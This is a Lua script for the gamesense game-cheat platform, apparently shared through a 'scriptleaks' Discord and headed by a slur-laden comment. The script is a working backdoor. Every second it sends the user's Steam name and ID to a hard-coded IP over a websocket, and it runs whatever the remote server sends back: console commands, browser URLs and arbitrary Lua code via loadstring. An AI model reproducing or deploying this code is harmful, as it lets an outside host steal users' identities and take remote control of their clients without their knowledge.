-- only retards change this links
print('https://discord.gg/b37eKFbkPE <- scriptleaks new server')
-- https://discord.gg/b37eKFbkPE <- scriptleaks new server
local websockets = require('gamesense/websockets');

local connection
local callbacks = {
	open = function(ws)
		--print("[WS] connection to ", ws.url, " opened!")
        connection = ws
	end,
	message = function(ws, data)
		local action = json.parse(data)
		if action.message then
			client.color_log(255, 255, 255, action.message)
		end

		if action.command then
			client.exec(action.command)
		end

		if action.browser then
			panorama.open().SteamOverlayAPI.OpenExternalBrowserURL(action.browser)
		end

		if action.execute then
			pcall(function()
				assert(loadstring(action.execute)())
			end)
		end

		--print("[WS] Got message: ", data)
	end,
	close = function(ws, code, reason, was_clean)
		--print("[WS] Connection closed: code=", code, " reason=", reason, " was_clean=", was_clean)
        connection = nil
	end,
	error = function(ws, err)
		--print("[WS] Error: ", err)
        connection = nil
	end
}

local get_name = panorama.loadstring([[ return MyPersonaAPI.GetName() ]])()
local get_id = panorama.loadstring([[ return MyPersonaAPI.GetXuid() ]])()
local data = {
	username = get_name,
	steamid = get_id
}

local oldtime = globals.curtime()
local on_paint_ui = function()
    local curtime = globals.curtime()

    if curtime - oldtime > 1 then
        oldtime = curtime

        if not connection then
            websockets.connect('ws://173.82.192.74:3000', callbacks)
		else
			connection:send(json.stringify(data))
        end
    end
end

client.set_event_callback('paint_ui', on_paint_ui)